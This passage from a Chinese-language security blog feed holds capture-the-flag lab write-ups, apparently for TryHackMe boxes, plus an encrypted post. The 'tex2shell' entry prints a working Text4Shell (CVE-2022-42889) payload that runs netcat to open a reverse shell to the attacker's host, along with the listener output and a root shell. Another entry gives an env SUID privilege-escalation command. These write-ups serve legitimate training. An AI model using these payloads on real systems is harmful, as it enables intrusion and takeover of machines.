class="line">fi</span><br></pre></td></tr></table></figure><p>思路：<br>上传恶意的clean.sh 替换这个 导致反弹shell</p><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><p><a href="/../assets/img/Pasted%20image%2020241120230510.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241120230510.png"></a></p><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><p>env具有suid 权限可以进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/env /bin/sh -p</span><br></pre></td></tr></table></figure><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h3 id="使用-find-查找所有系统-SUID-程序"><a href="#使用-find-查找所有系统-SUID-程序" class="headerlink" title="使用 find 查找所有系统 SUID 程序"></a>使用 <code>find</code> 查找所有系统 SUID 程序</h3><p>可以更精确地查看系统中常见的目录中具有 SUID 权限的程序，例如：</p><p><code>find /bin /sbin /usr/bin /usr/sbin -type f -perm -4000 2&gt;/dev/null</code></p><p>这些目录通常包含系统的可执行文件，通过此命令你可以检查这些目录中是否存在具有 SUID 权限的文件。</p><h3 id="使用-which-或-whereis-确定程序的位置"><a href="#使用-which-或-whereis-确定程序的位置" class="headerlink" title="使用 which 或 whereis 确定程序的位置"></a>使用 <code>which</code> 或 <code>whereis</code> 确定程序的位置</h3><p>如果你怀疑某个程序具有 SUID 权限，可以使用 <code>which</code> 或 <code>whereis</code> 命令来查找该程序的路径，然后使用 <code>ls -l</code> 查看其权限：</p><p><code>which &lt;program_name&gt;</code></p><p><code>which passwd</code></p><p>然后查看 <code>passwd</code> 程序的权限：</p><p><code>ls -l $(which passwd)</code></p><h3 id="示例输出"><a href="#示例输出" class="headerlink" title="示例输出"></a>示例输出</h3><p>如果一个文件具有 SUID 权限，你将看到类似以下的输出：</p><p><code>-rwsr-xr-x 1 root root 12345 Apr 1 2024 /usr/bin/passwd</code></p><p>在这个例子中，<code>/usr/bin/passwd</code> 是一个 SUID 程序，意味着即使普通用户执行它，它也会以 root 权限运行。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过使用 <code>find</code> 命令查找具有 SUID 权限的程序，或者直接查看文件的权限，你可以识别出可能带来安全风险的程序。确保定期检查系统中具有 SUID 权限的程序，并限制它们的使用权限，尤其是对于不再需要的 SUID 程序。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tex2shell</title>
      <link href="/2024/11/20/text2shell/"/>
      <url>/2024/11/20/text2shell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：<br>描述：<br>前置条件：</p></blockquote><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.216.153</td></tr><tr><td>OS</td><td>kali</td><td>linux</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PORT     STATE SERVICE    REASON</span><br><span class="line">21/tcp   open  ftp        syn-ack</span><br><span class="line">22/tcp   open  ssh        syn-ack</span><br><span class="line">80/tcp   open  http       syn-ack</span><br><span class="line">8080/tcp open  http-proxy syn-ack</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.216.153/dev/secret.txt</span><br><span class="line"></span><br><span class="line">From Testing Department</span><br><span class="line">Hello developers netcat can&#x27;t execute commands on server you can use traditional netcat commands</span><br></pre></td></tr></table></figure><h2 id="信息发现"><a href="#信息发现" class="headerlink" title="信息发现"></a>信息发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└─$ ftp 10.10.216.153</span><br><span class="line">Connected to 10.10.216.153.</span><br><span class="line">220 (vsFTPd 3.0.5)</span><br><span class="line">Name (10.10.216.153:leo): anonymous</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||41942|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 65534    65534          33 Aug 07 17:54 msg.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get msg.txt</span><br><span class="line">local: msg.txt remote: msg.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||9215|)</span><br><span class="line">150 Opening BINARY mode data connection for msg.txt (33 bytes).</span><br><span class="line">100% |*******************************************************************************************************|    33        7.47 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">33 bytes received in 00:00 (0.11 KiB/s)</span><br><span class="line">ftp&gt; exit</span><br><span class="line">221 Goodbye.</span><br><span class="line"></span><br><span class="line">┌──(leo㉿HACK)-[~/SecLab]</span><br><span class="line">└─$ cat msg.txt</span><br><span class="line">Hello Hackers Welcome in pWnbox.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>XSS</p><p><a href="/../assets/img/Pasted%20image%2020241120014623.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241120014623.png"></a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p> <em>Java Spring</em><br>里面里面的javascript rce?</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>payload</p><p>Text4shell（CVE-2022-42889）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;script:javascript:java.lang.Runtime.getRuntime().exec(&#x27;nc.traditional -v $target_IP $target_PORT -e /bin/bash &#x27;)</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241120021514.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241120021514.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(&#x27;nc.traditional 10.17.5.121 4443 -e /bin/bash&#x27;)&#125;</span><br></pre></td></tr></table></figure><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">└─$ rlwrap nc -lvnp 4443</span><br><span class="line">Listening on 0.0.0.0 4443</span><br><span class="line">Connection received on 10.10.216.153 42288</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libx32</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">snap</span><br><span class="line">srv</span><br><span class="line">swap.img</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">id</span><br><span class="line">uid=1000(pwnboy) gid=1000(pwnboy) groups=1000(pwnboy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd)</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">pwnboy@pwnbox:/$ ls</span><br><span class="line">ls</span><br><span class="line">bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr</span><br><span class="line">boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swap.img  tmp  var</span><br><span class="line">pwnboy@pwnbox:/$ whoami</span><br><span class="line">whoami</span><br><span class="line">pwnboy</span><br></pre></td></tr></table></figure><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><p><a href="/../assets/img/Pasted%20image%2020241120023054.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241120023054.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241120023027.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241120023027.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>未授权用户文件上传漏洞</title>
      <link href="/2024/11/19/%E6%9C%AA%E6%8E%88%E6%9D%83%E7%94%A8%E6%88%B7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/11/19/%E6%9C%AA%E6%8E%88%E6%9D%83%E7%94%A8%E6%88%B7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="5a7d6ceb7deb87cdd2f3c73632fd31fd7d1a286e09a0fc63b847d8204ccfb5d1">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f2596ed4801e413b89a531c9847c983d83ba6e0e9d3f8d4abb6b69b4a9eabd1dd7743b465ec5b8c9c7ef1519f33b98e4b4b763a6611393b26e31debc155e9744edc54cc22d1a49569344458c34d5e100cf4788106f6e13cf36298e30707416f28c017d618af0023d40490106cea9d92b5b12a923eb70a59a8e264e03642163f84b85c58f6734c2557dd6769d6e95f7d1b987f60d19da4f2bccf6a4526b234a6d6001ad931563663275ec62c3af1c07fe435a50e1d54c52535b311a7671c975a3dd48db2948bec26f66eb116d79a1278040739078b677f7f6eb1074598d0855063e9c683a06281ee2fe14501f5a81febf71f9235e72564c568a49213650caf01aa29ed0648b26418f3e5298d51c6f10bb800806e1fe769dc48d6e8a2310ade42cc54e909f504b9e0ff0f7c35a48b371af8d5e0720bf4f0edc1496c1767dc2cef5d0cc35c4e6a326a6a46cb37450561caaa304e8f796d5763673cc8fad2f84a2926aabd0a1f7d4c53215b22e624c7c0052243af01effa14c7d451a79fbc8060b3dd289f20e0486aa558bcd563d8542fca34aa43a57d2437c112098121410001aa4bcde344bd9dc14c62c8c3fb9ebdf3bf30e37d8a6d7a25fa920c205ad03cdc59368ad4b9003f9de8b27764712e8cbfdb665867b5378500321383f2a0103235a9b7b3700f4f94098b002fc4fa36902a7c97ed379fff99b164a94938b4ea88c68c12b2b3d1746345f6e571067c4a1938e163f14f10058d5f16190a519920764cba9162976b929b67a925161e344609b2b21c76c4daad2d7231a4ff2301e893d132042a2ebd63791e29884410d644a8eece19245c0868b73b1f9f360181c6a5a1a26e90581a6d241b7d437b4b81d362f72fb91d024b428ab3c35b9131819466b54dfa3266c18aa7218865d78a3282d3227abe3dd766e23efdc010baa0ed0e20a52fb0444e7d9a1f7806fbba59f5528d182b29eaf984a183b964156eab32248e69ee9c9c52f0ae8b416ab138ece3a12be14399f44026d5b971631c10842ddff71ccc23d643b182607a00cc9fe07628e7db994810e8710832d1c2f30fafd8ddd34c2a9476f668efc803d1587785d94cbe94c9ccc119490d8087bb8af8e500e2dd46fc70b0f19bab900a7e714805af39ace728b1f6b6d274ca0ccf12f79703ed696b3b37ec735a20d492c925e57fb199fda7b6af4b34db34be009a562a2702eb6ad82f9367d1da3be8a7225c071aa8609af920182020b637902e0d9f1af1db6aeb4390eeda599e37223883e97a27166364a406acdfd7cb5b952dac69e88f86d0d481b1e311361778d81339e1ff6d309c63ebe5bbb3c0c2034c1143d92aab14fe6d07bc43f2144d0672caa81b474669ab5090787b5f3366fc3c3bebd2c38f45256f9a19f6624afe7777f21b0a4044c58b4bdfd8a6e27ce2639366a53ad219217aa34678dfac5aa872a950af5896b7cc58b3a5d4d92b68ab2366d44f5970b4ae04839777959d21307eed3c3cc8bf8e44aee9c14a8ecda00de22938215acc17d67cf8a0885c515b837df0b880a73174ef8b66f39b2b7ce54e1ad9297e887f51a4e5afbefe83108d46dad74a9d2620910c3c91ef53cfa9b61f88cd2c8108358aa0e54eeda5b62b7495566fe72ff9f5c4f9013cfe3a4703e70845294696451131249b1612ff242d3123c7d08795c83e820a8938c79f9032ab50d644b82ac6a90419b91621b0de352c9c41caec85bce65b6d1c3011686ca0888f022ff9a2a770607ad9e227be072cecc61678d49c1be92c72f713a63f427ec22ac3a07a531d757e5963a0aa5241760eaf3a939c39d900c815e223e98f278102c37b7d494c74a800cc18c59e1240b07482a9847554837d91ad7c9f9bd35282e7586d7add6dfcec4464b9465f0f129caa48297d859616d6bd16aacae4380df4456b7e9bac316940e461a8406ac6936fea54abaf6c4ee105ce2642919de1e67607be69b392e7934bc4a8cc2fd848dcab2a7dfab81577f4fed997e180c45dd85b000a2d5b88b75fc496f0143449324dd07a9e60a1bf6dd17d7835ba9600212fbbde42d902cc84ca48f0b63d072363cfd2dd8fa2027e5221f9c78e08bda848747427a0afbea1c8c50ff5d9057eac348e4f61e0db5dfec5d18c2fce6efcd1842119f3043366cab1139aba519d7ce2a470ecbd2ec0e6a34d38444865643f84b0f21ca450bcbfa2c45ef51f21082f70ae631b64d41b576c2d4f80d0f6ce0b5bb737e024d1fa8d3c7d003736fb2a1755cc46945f5a3e47fd2bf4ea9f2d3fa6881fbd3eec32804ba798a5a596f26aef115ea08bdf657ff5fced9ba3e90cc50bbd17a09229a9bf6d75a2e185913a361a9a27ad9fc63fa8a74d5b096d8eba6805b053de151c509f8e62855faa2f42fee247bb7218f0f4a016835a3290902a87a34d7a0906f1f561e5948c35e08ce40de77b716a3d937d27e32a875e1c8d6632c52ab1106ffff4c2343d28e310937b794fc1153e384067f711552eebcb22e339964c9c0aeba51ccdad76446c9bb3dcc0e66f49046323c1619edd275b75618f00dc7dee99d9e3a94a55ff7a2420c82664718d374b9e0440c026a417ee0795d0fb5ff130b59e18e5e836343853a7a553c8e6e13d0b21cf955e45c60c4e39325e41f39ecb8c118c4a9fa33e8d360e2f53116b96388fdec6bc90a8b9f6fd1d5b1fb09ebb86ec4cb00a6be2717dca5ac369b9a1bcbc8fc4799b8605d256d98ccbb93623fcbdb54bf2639b6970a187bbb46f8436bb107be3521d9eda968c2954263998075290660155e468bf76156fcf5563da007eb68129495335b862583930a898107f0a5e79a8477886d4c4f2ab675fb3d83604df1e7b3a942bcc5dc108efc4d5836fa94f2b6525a756a3b3f28d0b135adcd441c5101092366e52b29aafb8bae36936da40f58c7f0d5eb42e99e076cac7eca7ab10a0b77eb8a31205461e2f7114aa5c9bd0e59bacdbe5719c5d8e0cd45a8c775053dea2e5cf1b0a979e9cbf1d209dd47a64ee3d7658253c764720022705248a3be7478aec69758c6ae7371c6f011a314fd3e353899a218df1c6233eefbc6a2793f2b9076bb275824406bbcd212655889f117643e6b030754cd83c2c28325ef19990dc9052a867ef6528f7fc4ac9856a5b319828ef97af0298c5d1b9ce426241518deacd5890b2d7f05312a9a815196f1569d0411b53c9645ae961462f1d9543edb6b349f5499de0df96fc6b46ac0286b048b100c725618f4e76056761ca1fe66546796329b1b590a11a9e765ecc7d03816fdceb1be381b22e890ed375312c9e6221c866f6ac3bc61d20ebf4ab8e4f5c90192e3480d6beff0fef7940bb823ef0beb387619a51ea7dde8ef055b0db73e84c669e1fc7a243b77b2f7168cd70e9b34c97ef68ffbf41557d2970f30caadb52bb76a70fda84c07c2295faea0645e29feef8f9d3ab16b8a2d42b85bcf2094e9f2b8ddfe4bfde9736b1e2f91a476f2e129f17deef6af31bcb73dc5665801b86b6be326659d3ca311aba40121036077d248906cb93732a759d923365726a68d8a202ada338dff03d56e5709f88a25611fa80b5d8f37e8bb3f808d9f1f6273083f11d4383b70a8871ea258a330be9fc871bca0d74fe5e19487e021a5580013c6774e18d781fa1cd5a20d47a3f1e65b396d848501f70121149873ac44f826279f190b39cddd341ad84f790963289c6e1a9cf87c4c11594fbde47700b97736f01bc5a91212f80f270c0c8ae4c21700ef0fbb605de62f305a98aea5472d10e93abc1fd3a890537ee262732ddd57b6ae17732e98b3518d2203d84bef6667500c2ab4c48e6e32b2981a7d33b7f090a3befbbe80f5fdfa6c3768d3c55ce2439df5002715f49249a8b8557f68ee7d1c001d3f96282a551d677fa158fa2943898e2741e7e2a07bb7340c8de85aa60487940226f2e7be5342f9813be3cc4631a719d4ed25dc8a8d2a8e443adc35f0e071ba9cd91af23ded3adb41bd6f6a19c97745954f2b28c097ed3297a6c504b6dc46e4c97fdc559709b61d1564b95d183ecf1e04a1fdc10ce8e17457a780b6fede297df903a7c6b4032546a1ff863ff06038fa9f59fa64621a183ab7c14aa200fa34fb21f75826b2ea89df2ba7dd7e8b93b5286169372c09f6f4ebd4aca980d2be5746194b93390fdfa90b5c8a0f7b22aa6653a6dfd45b822b528d6805a10062ef8f2f27814bb6d8e5d03bbf6a47e33628d3e2c123ffd60da7a72b99e326a44b0bd146264253780cc2be157957a0d31d851edbba0f1aa13f550a4f1c0b46f19a1c1e466780baca371f3e0540995963121c8688210d7a8994497347deb37f808f976082df5dc3195381959dbb605d835f604fa3f728f8bf05d7dbf512537f099049e784c826d250e5dc6580059a4de6b89e2d9fbf8130772f0d6abf28b2fa85db468d4e84785b0c163454b941bc6411c1142c5044b0d86fa3fc627dddc587cd908996ae19c8e6eef1f00e3bca3c5f3c7a9169e7528736d20b46ed9702bdb78010c6c62e10361a659282ffab7eac920359175ac3f33cd459a246f2c06ae6b712be0ad667a10e647f59bcecbcfe487b312e1265ad05004873e43ea2bfd5ee5a6d5c322cc405b29fe8f5778d351a999484a7a355ea6a98b29d7134e7ae81089eac5542ec59ef6d7d7fd288e7f90758a6a5cc4d1b1af260e18b1ac5cd1a6665add47cf9b01139ff10d2afa88a1e737d5b5102b78ae986ca068fc8b4e6be80a85f7a83c5396465596bea84925bad21d698db522573071ba97affc374c36d85e8f7de24021c6433a39edcfcf8f19a4a9da0dea8f0a53c174309ecbb6aa2f38d12125bb766b5245cafe2adc054a84e251e7f1f9e2d243c51633f9914064fb9fbb8396300c9af7c1566ed828430cf7adf1a56c1e8bfb881df95dfc7b5db0b5afebac6d520edde5a74bfa83debf7574984b9f1b8ac823ffe1ce5ecf382f84da782add688a5d38dd89a78c67e6cf9dc0f92e01916ef00ba465a865386db1880adb22f33d03fd232101d3ade4844ed68cbd9970a0a56b2b818fd3656e5104aae80932fed79701938aabe9344ed70876b573544ab48f558e1e969631529f39b3e4612e55d4bb2e17a1ea1b6382fef719e5269df018ea09cb67eb8e94e3797ba68ac28b6bccd299a80fba970c3e3dfb5022a58de88b3976a226d9819d931d284299728662efd2203d807854a85ec1ddd1d6b5beba60d08351d88b177b6c95f2d667c1ca1069985d66bce8c0d5fd3ce90ca824adcfbdcfa211049f954fba6fc1973875315ed7a57f7c972f0a40493b52ef2b789e9638f63952905d8573c72146cc3b6cd7c3cc79f9c76e5510abccdfe70810093767bd7590572820e1eca7f1c6f74ccb994c04b5688b2df253cea2b90c1651987cbb07a5971d5928747766c2e0b946cfc68248ad82d081b6cee05989fb6a0f5e46a110121df2d722b4be1ae3b508f0a6734ce90e1712ad16ae74ce2548b4b4fc317f13c586e875db9dadd60728b5c0bf45339ddb9ae850c30e0564539561b9facc5592183577dcbd7b3ef6c4cedb9ddca8055a841cef91bb01dc0202db652f6484be7f8f49cd53f1b2a7401ee1c6b2b4592bb8a694ada3634d0722b7b3e74bd7b6fb6791bfa5ed9c3ea4e084c4df5527e810532d7b6830b44ac6fe3d1006647290136607b9b7bc69bda9962dd88f55c7a25daea0c19435d30b70aef916e3eb8695bb8d1740dfc532e5e613ba71da858a58d3fbe8d88e9026829a2d9da13c77e5c2d917c7ca54d4afaecdd241cf7d38463c1ff77c0ee903b0cec67a48aec9314870aae70c29be30fc3ab4902dd9e96a4fffebc47ab15bb09105fce48d82bd3c90e9192b501bda16b802016fc906a4c4c7e1670e2541297e2f264f92f1261f5ea32612d10bee22d26dde6ab76167335652f567f54eda41e70e6ecf196ff563d8049220e6e924ea7b69d0ce505cbfa00543538401a587afd8b591b03f0d5883a2874c25d02559c944d3b935b7b7bdcf74a1174f789f554387a5b49c5815fe7432e30db93b4c0077e051b2d9a9ce4e9db15a1198194bef79db929dd5c575861fabca3c392980a9c6a8f201fc1d6ff8090217a986afabfc966b4245d23687143efa9b3eee1bf16a23da0374a00853726207ddc17cad6414370e69125df4b150783398af7d17879159cf0daf72e76babe28d387b47bac2169c9a56e81e0340aa5234b5efe8ff2ca6cfb9d99dc80dcdb8e24da7e73d7220fba5a69e02bd4c098c06a1ae7b37cc4b3bcbff256c5efcbc2a05015324425e6b2c2b38fb7de212d5bcee46c967dbd8832514d22de5d47dcccf1fd08dcb255f097fb8b04af6d81cf1c7fd6425b6282ee753ea0a41a2833fcfeca27c660c60b14c737b34ab39bd737141587c464d673b0ef0509beb43b48fc630a23c15f10552cde260d4a6c935662b4c5ff717ec2de228cf482ac7d7fa6f2f32f50d1772dab1973150913c520556378c3cdcb19d3e57563e61bf620a8e2bfcedc4a951601284e2d4146622ee98c14b5ac02011413cfaff93a30d965c3cddfac16e704daf8058ae87390ced4c28faa17875f2bda8744676cbe2824762749549227d61f5d618c43cd75a93cbc21da0e8b5878e5c07e46ab7373cadde1b3e6a88dd363730182dcd23701256b45b623d0b27d9001b05fb8457e8998971bfe33fa604408ab635f453afb13723fb305614a3788cd50ac8445e78789de52cc15a8a10c6c7a58ba559097b5835252c0c06a2111f9477433fe3cce93cb7b2cbbc7f56f59bed9ae7e89d0eace9f36a65c347ea295ba4b4626430055c21641b192fdbfc23b033c6eab45c787b2c0c30af26533fcbe9ccbac2de21e9b3f307ca90147a0afe8d1eb20bf99bf52297e6edf183dd61d2c1a3ecb74dfaf9f6da779a8880546d5a6470fd566f9bfc48aefacfe7ad0db9102c6d3b12a8ab660d6b9ac402339355f099f5829571f0e803bdb2a2a1bace4a473c87a15dec75dc693da09ae10a1c769edadb2a45446e9f799f86b6a617faab95b8eddf3f7da0234847208d878390f0d84373e2906d0d2d38cdd6a035d9eeefacb12b343ef2b37392372011d854968f9c62c630eba5483d94fd42d9c19843094ac7222f4e56e2bddb481e37ab6b767b4d2e15c4d85dfe0cc5d81b3a338f7e9a3140bf3130ce69499e1288cfd3ac857581a4bce362ba289448bddc4acde528cf0ef60381c789c6875ac506788a18ef215c7b344284753f834e72868213d6d39e750969ce7d4d00acfded9052ab528bcb6e865cf2de72a9ccb9262165ed0e2df15d706a86156b691fb3463f583e4f0158ad7a0aef0a8747bef1f62ea513b94245be268caab2c5fd3546524c07d704ae13139e82af85f875824f29241b721d729c36d3e32678f6dbc64001de246a1eea14966cc0a664e280cd04e757f45b276aa4628314617232c2455da553ae956b14f9b4cac6d2c42464bd84061603f55c8a217ad9c2f86be97c434dccdd4c3645f01a770377e078a5ccc497f3a5092d2967547e4e610e5cedc61002312c583fc02599d9bbbecb00c5bb62660f21e5d8e7805a04e366d954668e3bab8e6c707cabd933b643dff546b51d64c553f460a181249c1354846b8e0524db99f02c1938923d6ab29bc50c92cf44a4827a2ba368d46a7759b31f88863f791ca5ae0b101d0699df74194e3497e264694c8327fd479664ae0fd705b4e48128e3ac58ffcb7757ae26dfdec7b7d73b3e4c539c1ca39a7863d53887355090e8d47333b0d4753522303f1ef40f732d3e0ae06825ecbed1347e9a6835f90c8eb9d72f6f54623e1ad24a241e20226ed283f4cd8ef2280e8c55c046b135005cfde61fc8359ad1597376e884ae58b54cf450a6efd3e1f3664b53741a5b4d251b517574afb3ed030edf1fe6c8dccb1edc3781e0a7d3ff2e161c796077068a0862ffd8684ec5a2df56b441b52a3c4c47a45fc8033d0c99de5992cb201f7cc20b20b869f64a67234ded871b4945e5c2203cb0edef252b6ab84b928e549756fadfa973a9004df9535f29a0b053671435bf24ce58e96265a414cde8797bcd66b10425b1d0af604e2e62ea26394003b41c6bc2c18fe1dc119baf0fc6a0043f72f272543d7a72c43fb27e71c5a7650169b65c328972120ba5be4506c1f63f58a04f203ad09c67babb507332bbbc9c495548e7d3d5da0f68b6a7f51311723978a0d0dc3b31e6cd9d36e7a085ca1cbbb218e0c21cf144d0e8ff34858e1d3fb13b2c3435d07cb0c9fd209a9a7ffde3d939bd434bb239ee0097f338ad914baaa46473505d82bcb2593b6a58ed1ddfa836df023dfdcf64001b00001e98817fd71276f35b6b10ad9783946a22ae4333ff8e9c92a81340dddda76a9ca4cadefe8317495872fc2bd2c22a647f8725f449ff21c13fb08498e205d6c1705e9157ad2b60a25891f6a459419a3f3fce8d467b75adbc7fed5adfcc7f0ac2650c08f05cb859f6bb28efeff5facd7a22fb1625e1d5c902157538eef0dba3c568bb8c4803210a93e390fbb0479b02d3825a7d9d60b1e7f7a72bfd145c6a6ce0c931521fde9a7a8b2f775624fce15db9f72b384c7c035cd5879e6fe1c6cc1f6c25a38592b3804e3c09fbb9e0873168367082a5b8e4abebcf4fb6cb349ae104107f0f94e869a2d5089970143ca5fec8e43292ba31588c8f5b6a7a94f0b1c383b9ce626fa68f39c96c643a68ba4249cc9c69358893bfdc82235a8ec1a0e46d2d8f3139e7e0dd9438d310a5baf8dcb7dc9c84f98db2ca0afc0c9c25a015e9fd1086009126046de852a58904766e7d82fc8f2e97fddda6f0d09be25b31689a816f7c84e0f0d654b11aee6ee2819754e16b22f1682648f86a2946a4fda2b6fe9817583f37ec87f1f46976c0ff2c